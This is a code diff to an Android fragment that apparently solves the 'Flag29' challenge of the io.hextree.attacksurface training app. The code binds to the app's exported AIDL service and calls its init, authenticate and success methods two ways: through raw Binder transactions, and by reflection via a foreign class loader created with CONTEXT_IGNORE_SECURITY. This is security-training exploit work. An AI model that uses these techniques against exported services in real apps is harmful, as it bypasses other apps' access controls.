@@ -19,21 +19,44 @@ import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.fragment.app.Fragment;
 
+import java.lang.reflect.Method;
 public class Flag29Fragment extends Fragment {
+    private static final String TAG = "Flag29Fragment";
 
-    private IBinder binder = null;
+    private IBinder aidlBinder = null;
+    private IBinder classLoaderBinder = null;
+    private boolean aidlBound = false;
+    private boolean classLoaderBound = false;
 
-    private final ServiceConnection serviceConnection = new ServiceConnection() {
+    // === AIDL ServiceConnection ===
+    private final ServiceConnection aidlConnection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
-            binder = service;
-            Toast.makeText(getContext(), "Service connected", Toast.LENGTH_SHORT).show();
-            Toast.makeText(getContext(), "Click the button again to get the flag", Toast.LENGTH_LONG).show();
+            aidlBinder = service;
+            aidlBound = true;
+            Toast.makeText(getContext(), "AIDL service connected\nClick again to proceed", Toast.LENGTH_SHORT).show();
         }
 
         @Override
         public void onServiceDisconnected(ComponentName name) {
-            binder = null;
+            aidlBinder = null;
+            aidlBound = false;
+        }
+    };
+
+    // === ClassLoader ServiceConnection ===
+    private final ServiceConnection classLoaderConnection = new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName name, IBinder service) {
+            classLoaderBinder = service;
+            classLoaderBound = true;
+            Toast.makeText(getContext(), "ClassLoader service connected\nClick again to proceed", Toast.LENGTH_SHORT).show();
+        }
+
+        @Override
+        public void onServiceDisconnected(ComponentName name) {
+            classLoaderBinder = null;
+            classLoaderBound = false;
         }
     };
 
@@ -41,24 +64,34 @@ public class Flag29Fragment extends Fragment {
     @Override
     public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
         View view = inflater.inflate(R.layout.fragment_flag29, container, false);
-        Button launchButton = view.findViewById(R.id.btnLaunchFlag29);
 
-        launchButton.setOnClickListener(v -> {
-            if (binder == null) {
-                Intent intent = new Intent();
-                intent.setComponent(new ComponentName(
-                        "io.hextree.attacksurface",
-                        "io.hextree.attacksurface.services.Flag29Service"
-                ));
-                requireContext().bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
+        Button aidlButton = view.findViewById(R.id.btnLaunchFlag29AIDL);
+        Button classLoaderButton = view.findViewById(R.id.btnLaunchFlag29ClassLoader);
+
+        aidlButton.setOnClickListener(v -> {
+            if (!aidlBound) {
+                bindAidlService();
             } else {
                 try {
                     String token = callInit();
                     callAuthenticate(token);
                     callSuccess();
                 } catch (RemoteException e) {
-                    Toast.makeText(getContext(), "Remote call failed", Toast.LENGTH_SHORT).show();
-                    e.printStackTrace();
+                    Log.e(TAG, "Remote call failed", e);
+                    Toast.makeText(getContext(), "Remote AIDL call failed", Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
+
+        classLoaderButton.setOnClickListener(v -> {
+            if (!classLoaderBound) {
+                bindClassLoaderService();
+            } else {
+                try {
+                    callViaClassLoader();
+                } catch (Exception e) {
+                    Log.e(TAG, "ClassLoader call failed", e);
+                    Toast.makeText(getContext(), "ClassLoader call failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
                 }
             }
         });
@@ -66,16 +99,16 @@ public class Flag29Fragment extends Fragment {
         return view;
     }
 
+    // === BEGIN ===
+    // === AIDL Binder methods ===
     private String callInit() throws RemoteException {
         Parcel in = Parcel.obtain();
         Parcel out = Parcel.obtain();
         try {
             in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
-            binder.transact(1, in, out, 0);
+            aidlBinder.transact(1, in, out, 0);
             out.readException();
-            String result = out.readString();
-            Log.d("Flag29", "init(): " + result);
-            return result;
+            return out.readString();
         } finally {
             out.recycle();
             in.recycle();
@@ -88,7 +121,7 @@ public class Flag29Fragment extends Fragment {
         try {
             in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
             in.writeString(token);
-            binder.transact(2, in, out, 0);
+            aidlBinder.transact(2, in, out, 0);
             out.readException();
         } finally {
             out.recycle();
@@ -101,19 +134,86 @@ public class Flag29Fragment extends Fragment {
         Parcel out = Parcel.obtain();
         try {
             in.writeInterfaceToken("io.hextree.attacksurface.services.IFlag29Interface");
-            binder.transact(3, in, out, 0);
+            aidlBinder.transact(3, in, out, 0);
             out.readException();
         } finally {
             out.recycle();
             in.recycle();
         }
     }
+    // === END ===
+    // === AIDL Binder methods ===
+
+    // === BEGIN ===
+    // === ClassLoader-based method ===
+    private void callViaClassLoader() throws Exception {
+        ClassLoader classLoader = getForeignClassLoader(requireContext(), "io.hextree.attacksurface");
+        Class<?> iface = classLoader.loadClass("io.hextree.attacksurface.services.IFlag29Interface");
+
+        Class<?> stubClass = null;
+        for (Class<?> inner : iface.getDeclaredClasses()) {
+            if (inner.getSimpleName().equals("Stub")) {
+                stubClass = inner;
+                break;
+            }
+        }
+
+        if (stubClass == null) throw new ClassNotFoundException("Stub class not found");
+
+        Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
+        Object remote = asInterface.invoke(null, classLoaderBinder);
+
+        Method init = iface.getMethod("init");
+        String token = (String) init.invoke(remote);
+
+        Method auth = iface.getMethod("authenticate", String.class);
+        auth.invoke(remote, token);
+
+        Method success = iface.getMethod("success");
+        success.invoke(remote);
+
+        Toast.makeText(getContext(), "ClassLoader method succeeded", Toast.LENGTH_SHORT).show();
+    }
+    // === END ===
+    // === ClassLoader-based method ===
+
+    // === Service Binding methods ===
+    private void bindAidlService() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.services.Flag29Service"
+        ));
+        requireContext().bindService(intent, aidlConnection, Context.BIND_AUTO_CREATE);
+    }
+
+    private void bindClassLoaderService() {
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName(
+                "io.hextree.attacksurface",
+                "io.hextree.attacksurface.services.Flag29Service"
+        ));
+        requireContext().bindService(intent, classLoaderConnection, Context.BIND_AUTO_CREATE);
+    }
+
+    private ClassLoader getForeignClassLoader(Context context, String packageName) throws Exception {
+        Context foreignContext = context.createPackageContext(
+                packageName,
+                Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY
+        );
+        return foreignContext.getClassLoader();
+    }
 
     @Override
-    public void onDestroy() {
-        super.onDestroy();
-        if (binder != null) {
-            requireContext().unbindService(serviceConnection);
+    public void onDestroyView() {
+        super.onDestroyView();
+        if (aidlBound) {
+            requireActivity().unbindService(aidlConnection);
+            aidlBound = false;
+        }
+        if (classLoaderBound) {
+            requireActivity().unbindService(classLoaderConnection);
+            classLoaderBound = false;
         }
     }
 }
